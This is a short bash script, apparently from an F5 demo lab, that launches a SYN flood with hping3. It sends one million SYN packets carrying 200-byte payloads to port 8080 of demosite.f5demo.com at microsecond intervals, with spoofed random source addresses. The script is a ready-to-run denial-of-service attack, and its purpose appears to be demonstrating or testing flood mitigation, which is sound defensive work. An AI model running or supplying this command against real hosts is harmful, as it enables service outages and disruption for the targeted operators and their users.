#!/bin/bash
date
echo "Starting Oversized SYN Flood: hping3 -c 1000000 -S -i u5 -p 8080 -d200 demosite.f5demo.com"
hping3 -i u5 -c 1000000 -S -p 8080 --data 200 --rand-source demosite.f5demo.com
date
